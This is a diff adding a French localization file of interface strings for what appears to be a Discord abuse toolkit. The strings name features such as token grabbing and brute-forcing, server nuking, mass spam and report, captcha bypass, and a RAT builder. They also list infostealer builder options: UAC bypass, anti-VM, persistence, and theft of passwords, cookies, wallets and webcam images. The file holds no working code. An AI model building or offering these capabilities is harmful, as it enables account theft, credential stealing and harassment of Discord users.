@@ -1,0 +1,396 @@
+Info du jeton{end_space12}
+Connexion du jeton{end_space8}
+Destructeur de jeton{end_space5}
+Collecteur de jeton{end_space6}
+Désactivateur de jeton{end_space3}
+Brute-Force de jeton{end_space5}
+Faux tapeur{end_space14}
+Tireur de vanité{end_space9}
+Spam groupe{end_space14}
+Bloqueur d'amis{end_space10}
+Suppresseur d'amis{end_space12}
+Supprimer demandes d'amis
+Créer serveurs{end_space11}
+Changeur de profil{end_space7}
+Captureur de code QR{end_space5}
+Bot Discord RAT{end_space10}
+Presseur de bouton{end_space7}
+Réacteur de message{end_space6}
+DM de masse{end_space14}
+Rapport de masse{end_space9}
+Ami de masse{end_space13}
+Supprimeur de DM{end_space9}
+Effaceur de DM{end_space11}
+Contournement des règles{end_space1}
+Contourne RestoreCord{end_space4}
+Contourne marteau-pilon{end_space2}
+Outil de webhook{end_space9}
+Fabriqué par Plingenn{end_space4}
+Journal des modifications
+Paramètres{end_space15}
+Discussion
+Gérer les jetons
+Suiv. page{end_space1}
+Fonctionnant sur:{end_space3}
+Choix invalide, veuillez réessayer!
+Interrompu par l'utilisateur.
+Changeur de thème
+Paramètres du compte
+Paramètres de proxy
+Paramètres d'apparence
+Bascule du mode de débogage
+Panneau d'administration
+Paramètre invalide
+CYAN
+BLEU
+VERT
+ROUGE
+BLANC
+JAUNE
+MAGENTA
+ROUGE CLAIR
+BLEU CLAIR
+VERT CLAIR
+CYAN CLAIR
+NOIR CLAIR
+Thème défini sur
+Aperçu du compte
+Ma licence
+Historique d'achat
+Utiliser le code
+Télécharger le logiciel
+Nom d'utilisateur
+Créé le
+Modifier le nom d'utilisateur
+Se déconnecter
+Échec du changement de nom d'utilisateur, Le nom d'utilisateur doit contenir au moins 3 caractères.
+Voulez-vous vous déconnecter de votre compte ? (O/N)
+Produit
+Expire dans
+Date
+Entrez votre code produit pour obtenir votre contenu.
+Code
+Vous avez déjà utilisé le code.
+Assurez-vous de sauvegarder votre produit avant d'appuyer sur Entrée !
+Clé non trouvée dans la réponse
+Échec de la récupération des données pour le code fourni
+URL non trouvée dans les informations du code
+Code invalide !
+Activer l'utilisation du proxy
+Effacer le cache du proxy
+Ajouter ses propres proxies au cache
+Récupérer les proxies
+Choix invalide
+Mode de débogage basculé {ROUGE}OFF
+Mode de débogage basculé {VERT}ON
+Ajout d'un nouveau système d'authentification
+Amélioration du système de configuration
+Interface du panneau remaniée
+Ajout d'un système de discussion
+Ajout de nouveaux paramètres de compte
+Mise en cache pour de meilleures performances
+RPC Discord personnalisé
+Basculer le RPC Discord
+Basculer le RPC Discord personnalisé
+Modifier le RPC Discord personnalisé
+RPC Discord personnalisé désactivé
+RPC Discord personnalisé activé
+Détails (Obligatoire)
+Les détails doivent comporter au moins 3 caractères.
+État (Obligatoire)
+L'état doit comporter au moins 3 caractères.
+URL de grande image (Optionnel)
+Texte long (Optionnel)
+URL de petite image (Optionnel)
+Texte court (Optionnel)
+Combien de boutons voulez-vous avoir ?
+Entrez le libellé du bouton
+Entrez l'URL du bouton
+Format d'URL invalide. Veuillez entrer une URL valide.
+Nombre invalide de boutons. Veuillez entrer un nombre entre 0 et 2.
+RPC Discord désactivé
+RPC Discord activé
+Mode Normal
+Mode RestoreCord (contournement captcha)
+Vérificateur de cache
+Vérificateur personnalisé
+Vérificateur de serveur
+Entrez le chemin personnalisé pour charger les jetons
+Discussion normale
+Discussion de support (Indisponible)
+Discussion privée (Indisponible)
+Recherche de serveur{end_space5}
+Clonage de serveur{end_space7}
+Destructeur de serveur{end_space3}
+Jointeur de jetons{end_space7}
+Quitteur de jetons{end_space7}
+Spammeur de jetons{end_space7}
+Crise{end_space20}
+Spammeur de mixage{end_space7}
+Jointeur de salon vocal{end_space2}
+Changeur d'image de profil{end_space3}
+Modif. pseudo global{end_space5}
+Changer pseudo serveur{end_space6}
+Changeur de HypeSquad{end_space4}
+Changeur de pronoms{end_space6}
+Changeur de langue{end_space7}
+Changeur de statut{end_space7}
+Changeur de thème{end_space8}
+Changeur de biographie{end_space3}
+Générateur de compte{end_space5}
+Créateur crash vidéo{end_space5}
+Cycle de paramètres{end_space10}
+Notes de mise à jour{end_space5}
+Télégramme{end_space15}
+Selfbot{end_space18}
+Github{end_space19}
+À propos{end_space17}
+Quitter{end_space18}
+Page précédente
+Noms des serveurs
+Message
+Nombre de fils
+Une erreur s'est produite :
+Aucun jeton trouvé dans le cache
+Déploiement de Rain Nuke
+Rain Nuke déployé. . .
+Messagerie
+ID du message :
+Message envoyé à tous les amis disponibles.
+Guilde quittée :
+Guilde supprimée :
+L'erreur suivante a été rencontrée et est ignorée :
+Toutes les guildes disponibles ont été supprimées/quittées.
+Suppression d'ami :
+Ami supprimé :
+Tous les amis disponibles ont été supprimés.
+Création
+Créé
+Tous les serveurs ont été créés.
+Rain Nuke a explosé avec succès !
+Transformé avec succès en terre de Reme
+Entrez quelque chose pour continuer. . .
+Démarrage du mode de saisie (Activation/désactivation du mode clair/sombre)
+Pas assez d'amis pour continuer.
+Une erreur s'est produite lors du traitement du jeton
+Spammeur de canal
+ID du canal
+Contournement des règles
+ID de la guilde
+Simulateur de saisie de jeton
+Nichoir global
+Pseudo
+Simulateur de serveur
+Changeur de pronoms
+Pronoms aléatoires (o/n)
+Pronoms
+DM supprimé :
+Pas assez de DM pour continuer.
+Cycle interrompu
+Spammeur de mixage
+Programme interrompu par l'utilisateur.
+Échec de l'envoi de l'impulsion cardiaque avec le jeton :
+Échec de la connexion au VC avec le jeton :
+Connexion au VC avec les jetons..
+Invitation mise à jour avec succès, votre serveur est désormais accessible par
+Échec de la mise à jour de l'URL de la vanité. Code d'état :
+Code de vanité à snipe
+ID du serveur où appliquer la vanité
+Délai entre les vérifications (en secondes)
+Le sniper de vanité a démarré. Appuyez sur Ctrl+C pour arrêter.
+Erreur :
+Spammeur de webhook
+Suppression de webhook
+Webhook
+Webhook supprimé avec succès
+Gestionnaire de jetons
+Enregistrer les jetons
+Effacer les jetons
+Vérifier les jetons et ne sauvegarder que ceux valides (o/n)
+Cache des jetons vidé.
+Entrez le chemin du fichier texte contenant les jetons
+Aucun jeton trouvé dans le fichier texte spécifié
+Vérificateur de jetons
+Impossible d'obtenir le nom du serveur :
+Connexion en cours
+Brute-force de jetons Rain. NB : Cela peut prendre beaucoup de temps pour fonctionner.
+Si vous avez beaucoup de chance et que vous pouvez obtenir le jeton de quelqu'un, vous le trouverez stocké dans 'brute-force.txt'.
+Demandez toujours l'autorisation explicite de la personne avant de mener une attaque par force brute sur son compte.
+ID utilisateur invalide, veuillez réessayer !
+VALIDE
+INVALIDE
+Erreur lors de la récupération des sources de facturation :
+Erreur lors de la récupération des données nitro :
+Aucune information de facturation disponible.
+Rassemblement d'informations sur l'utilisateur et des pilotes Web..
+Nom de fichier
+Mot de passe du fichier
+Voulez-vous fournir un fichier d'icône ? (O/N)
+Chemin d'icône ou URL invalide. L'icône est réglée sur Aucun.
+Me Pinguer (O/N)
+Anti VM (O/N)
+Mettre au démarrage (O/N)
+Contournement UAC (O/N)
+Fusion (O/N)
+Cacher la console (O/N)
+Capture de la webcam (O/N)
+Capture des mots de passe (O/N)
+Capture des cookies (O/N)
+Capture des saisies automatiques (O/N)
+Capture de l'historique (O/N)
+Capture des jetons Discord (O/N)
+Capture des jeux (O/N)
+Capture des mots de passe Wi-Fi (O/N)
+Capture des informations système (O/N)
+Capture d'écran (O/N)
+Capture de Telegram (O/N)
+Capture des fichiers courants (O/N)
+Capture des portefeuilles (O/N)
+FakeError (O/N)
+Titre de l'erreur factice
+Message d'erreur factice
+Bloquer les sites AV (O/N)
+Injection Discord (O/N)
+Icône de fichier
+Création de {name}.exe, cela prendra quelques secondes. Merci pour votre patience !
+Le fichier est dans 'output/grabberbuilder/{name}.exe
+Groupe créé
+Limite de taux ({response.json()['retry_after']}ms)
+Pas assez d'amis disponibles pour une sélection aléatoire
+Voulez-vous choisir vous-même les utilisateurs pour le spam de groupe ou souhaitez-vous en choisir au hasard ?
+Choisissez vous-même les utilisateurs
+Utilisateurs randomisés
+Création de groupchats
+IDs utilisateur
+Vous n'avez pas de virgules (,) le format est id, id2, id3
+à tout moment pour arrêter
+Bloqué :
+Erreur lors de l'obtention des relations :
+Pas assez de demandes d'ami pour continuer.
+Demande d'ami entrante de :
+Demande d'ami supprimée de :
+Nombre total de demandes d'ami supprimées :
+Une erreur s'est produite lors de la création de {server_name} : {e}
+Icône pour les serveurs oui/non
+Noms de serveurs aléatoires
+Noms de serveurs personnalisés
+Nom des serveurs qui seront créés
+Veuillez saisir l'emplacement de l'icône
+Impossible de trouver "{image}" sur votre PC
+Statut personnalisé
+Bio personnalisée
+Création du fichier... {i}
+Écriture du fichier... {i}
+Remarque : Ce code n'est pas entièrement fonctionnel pour le moment, mais il est toujours exécutable. Cependant, vous pourriez rencontrer des erreurs ou des bugs.
+Entrez le nom que vous souhaitez donner au fichier final
+Entrez le jeton du bot que vous utiliserez pour exécuter les commandes RAT
+Jeton du bot
+Entrez l'ID de la guilde sur laquelle les commandes slash sont enregistrées
+Erreur d'écriture du fichier : {e}
+Le fichier a été correctement écrit dans "output/{fileName}.py"
+Convertir votre script en exécutable (O/N)
+Création de fichier...
+Nettoyage des anciens fichiers...
+Le fichier exécutable a été correctement généré
+Une erreur HTTP s'est produite : {e}
+ID de message
+Veuillez sélectionner le bouton que vous souhaitez presser
+{r}({LIGHTBLACK_EX}{i}{r}) Nom : {LIGHTBLACK_EX}{button_label}{r}, ID personnalisé : {LIGHTBLACK_EX}{button_custom_id}
+Bouton
+Seul un bouton a été trouvé dans le message.
+Échec d'ajout de la réaction {reaction} au message {message_id}. Le nombre maximum de réactions a déjà été atteint.
+Le nombre maximum de réactions a déjà été atteint.
+Échec d'ajout de la réaction {reaction} au message {message_id}. Interdit : {error_message}
+Objets
+Visages
+Animaux
+Symboles
+Aucun emoji trouvé dans la réponse
+Échec de la récupération des emojis depuis l'API
+Lien d'invitation
+Format de lien d'invitation invalide.
+Une erreur s'est produite lors de l'envoi de la demande
+Informations sur l'invitation :
+Informations sur l'invitant :
+Informations sur le serveur :
+Chaîne
+Date d'expiration
+ID utilisateur
+Badges
+Indisponible
+Nom
+ID du serveur
+Description
+Bannière
+URL de la bannière
+URL de la bannière (Indisponible)
+URL de vanité
+Niveau de vérification
+Splash
+URL du Splash
+URL du Splash (Indisponible)
+Fonctionnalités
+La saisie a commencé. Appuyez sur Ctrl+C pour arrêter.
+Saisie interrompue
+Le cycle de langue a commencé. Appuyez sur Ctrl+C pour arrêter.
+Jeton invalide.
+Appuyez sur ENTRÉE pour continuer
+Outil Discord API | https://Rain.xyz | Créé par Plingenn
+Paramètres d'apparence
+Paramètres de texte
+Paramètres de curseur
+Paramètres de transparence
+Paramètres de fenêtre
+Paramètres de langue
+Schéma de couleur
+Police
+Taille de la police
+Hauteur de ligne
+Poids de la police
+Effets de terminal rétro
+Paramètres de couleur
+Paramètres de police
+Paramètres de taille de police
+Paramètres de hauteur de ligne
+Paramètres de poids de police
+Paramètres rétro
+Paramètres de curseur
+Langue définie sur {chosen_language}
+Sans nom
+Type
+Maison
+Lien du message
+Lien de message invalide
+Retour en arrière...
+Échec de la connexion à Discord RPC : {e}
+Choix
+Thème
+Réglage
+Modifier
+Langue
+Opacité du panneau
+Opacité invalide
+Paramètres de fenêtre
+Cette option est en cours de développement
+Cette option est actuellement indisponible. Veuillez patienter, elle sera ajoutée ultérieurement.
+Cette option est actuellement indisponible.
+Elle sera remplacée dans l'une des prochaines mises à jour par : '{replacement}'.
+Cette option n'est pas disponible
+Ces options sont actuellement en cours de développement
+Ces options sont actuellement en développement mais restent utilisables. Cependant, il est probable que des bogues ou des erreurs surviennent.
+Échec de la récupération des pronoms depuis {pronounce_url} ({statuscode})
+L'utilisation de proxy est actuellement indisponible. Nous nous excusons pour tout inconvénient. Elle sera rendue accessible dans l'une de nos prochaines mises à jour.
+Utilisation de proxy désactivée {RED}OFF
+Utilisation de proxy activée {GREEN}ON
+Nouveaux proxies écrits avec succès
+Proxies récupérés avec succès
+Terminé ! Scrapé {proxies} au total => {temp} | {execution_time}ms
+PC{end_space4}
+Support multilingue mis en œuvre.
+Fil de masse{end_space13}
+Spam sur le forum
+DM de masse utilisateur{end_space2}
+N/A{end_space22}
+Boosteur de serveur{end_space11}
+Jeton en ligne{end_space11}
+Créateur de sondage{end_space6}
